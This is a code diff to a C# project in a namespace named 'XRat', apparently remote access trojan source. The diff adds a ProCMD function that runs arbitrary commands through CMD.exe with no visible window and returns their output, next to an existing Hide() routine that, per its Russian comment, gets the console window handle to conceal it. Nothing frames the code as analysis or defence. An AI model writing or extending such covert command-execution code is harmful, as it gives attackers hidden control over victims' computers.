@@ -67,6 +67,49 @@ namespace XRat
             }
         }
 
+        public static (bool success, string output) ProCMD(string command)
+        {
+            string output = string.Empty;
+
+            // Start the CMD process with /min flag to run it minimized
+            var processStartInfo = new ProcessStartInfo
+            {
+                FileName = "CMD.exe",
+                Arguments = $"/min /C {command}",  // /min to minimize the CMD window, /C to execute and then terminate CMD
+                RedirectStandardOutput = true, // Optionally capture output
+                RedirectStandardError = true,  // Optionally capture errors
+                UseShellExecute = false,
+                CreateNoWindow = true
+            };
+
+            try
+            {
+                using (var process = Process.Start(processStartInfo))
+                {
+                    if (process == null)
+                    {
+                        throw new InvalidOperationException("Failed to start CMD.exe process.");
+                    }
+
+                    // Read the standard output
+                    output = process.StandardOutput.ReadToEnd();
+
+                    // Optionally, you can also capture errors
+                    string errorOutput = process.StandardError.ReadToEnd();
+
+                    // Wait for the process to exit
+                    process.WaitForExit();
+                }
+
+                return (true, output); // Return success and the output string
+            }
+            catch (Exception ex)
+            {
+                return (false, $"Error: {ex.Message}"); // Return failure and the error message
+            }
+        }
+
+
         public static bool Hide()
         {
             // Получаем дескриптор консольного окна
